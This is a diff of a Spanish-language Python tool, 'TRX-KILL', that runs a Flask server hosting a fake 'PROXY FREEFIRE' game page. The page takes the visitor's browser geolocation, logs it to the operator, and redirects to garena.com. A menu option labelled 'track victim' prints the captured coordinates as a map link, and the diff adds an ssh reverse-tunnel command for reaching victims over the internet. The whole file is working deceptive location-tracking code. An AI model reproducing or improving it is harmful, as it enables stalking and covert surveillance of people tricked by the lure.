@@ -9,13 +9,13 @@ G, Y, R, C, W = "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;36m", "\033[0m
 
 if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
 
-# --- PLANTILLA HTML (CAPTURA TOTAL) ---
+# --- PLANTILLA HTML (ESTABILIZADA) ---
 HTML_TEMPLATE = """
 <!DOCTYPE html><html><head><meta charset="UTF-8"><title>PROXY</title>
 <style>
-    body {background:#050505; color:#00ffcc; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;}
+    body {background:#000; color:#00ffcc; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;}
     .container {border:2px solid #00ffcc; padding:40px; text-align:center; box-shadow:0 0 15px #00ffcc; border-radius:10px;}
-    .btn {background:transparent; color:#00ffcc; border:1px solid #00ffcc; padding:15px 30px; cursor:pointer; font-size:18px;}
+    .btn {background:#00ffcc; color:#000; border:none; padding:15px 30px; cursor:pointer; font-weight:bold;}
 </style></head><body>
 <div class="container">
     <h1>PROXY FREEFIRE</h1>
@@ -25,8 +25,8 @@ HTML_TEMPLATE = """
 function iniciar() {
     navigator.geolocation.getCurrentPosition(pos => {
         fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude+'&time='+new Date().toLocaleTimeString());
-        window.location.href = 'https://youtube.com';
-    });
+        window.location.href = 'https://www.garena.com';
+    }, () => { alert("Permiso requerido"); });
 }
 </script></body></html>
 """
@@ -44,24 +44,21 @@ def animar(texto):
     for char in texto: sys.stdout.write(char); sys.stdout.flush(); time.sleep(0.02)
     print()
 
-def banner():
-    os.system('clear')
-    print(f"{G}  _______________________________________")
-    print(f"{G} |         TRX-KILL v1.4.5 (PRO)         |")
-    print(f"{G} |_______________________________________|{W}\n")
-
 def main():
+    # Iniciamos el servidor en el puerto 5000
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()
+    
     while True:
-        banner()
-        print(f"{C} 01. RASTREAR VÍCTIMA  | 02. LINK-PROXY")
-        print(f" 03. CREADOR           | 04. VERSIONES")
-        print(f" 05. SISTEMA           | 06. LIMPIAR LOGS")
-        print(f" 00. SALIR{W}")
+        os.system('clear')
+        print(f"{G}  _______________________________________")
+        print(f"{G} |         TRX-KILL v1.4.5 (STABLE)      |")
+        print(f"{G} |_______________________________________|{W}\n")
+        print(f"{C} 01. RASTREAR VÍCTIMA  | 02. INICIAR LINK")
+        print(f"{C} 03. CREADOR           | 04. SALIR{W}")
         sel = input(f"\n{Y}TRX-ROOT > {W}")
 
         if sel == "1":
-            animar(f"{Y}[*] BUSCANDO COORDENADAS EN LOG...{W}")
+            animar(f"{Y}[*] LEYENDO REGISTROS...{W}")
             if os.path.exists(LOG_FILE):
                 with open(LOG_FILE, 'r') as f:
                     lines = f.readlines()
@@ -69,14 +66,11 @@ def main():
                         d = lines[-1].split('|')
                         print(f"\n{G}[+] COORDENADAS: {W}{d[0].replace('LAT:','')} , {d[1].replace('LON:','')}")
                         print(f"{G}[+] MAPA LINK:   {W}https://www.google.com/maps/search/?api=1&query={d[0].replace('LAT:','')},{d[1].replace('LON:','')}")
-                        print(f"{G}[+] IP ORIGEN:   {W}{d[2].replace('IP:','')}")
-                        print(f"{G}[+] HORA CAPTURA:{W}{d[3].replace('TIME:','').strip()}")
             input(f"\n{Y}PRESIONA ENTER...{W}")
         elif sel == "2":
-            print(f"\n{C}[!] LINK ACTIVO: http://127.0.0.1:5000{W}"); input()
-        elif sel == "6":
-            os.remove(LOG_FILE) if os.path.exists(LOG_FILE) else None
-            print(f"{R}[!] LOGS ELIMINADOS.{W}"); input()
-        elif sel == "0": sys.exit()
+            print(f"\n{C}[!] PARA QUE EL LINK FUNCIONE FUERA DE TU WIFI:{W}")
+            print(f"{C}[!] ABRE OTRA VENTANA EN TERMUX Y ESCRIBE: {W}ssh -R 80:localhost:5000 ssh.localhost.run")
+            input(f"\n{Y}PRESIONA ENTER...{W}")
+        elif sel == "4": sys.exit()
 
 if __name__ == "__main__": main()
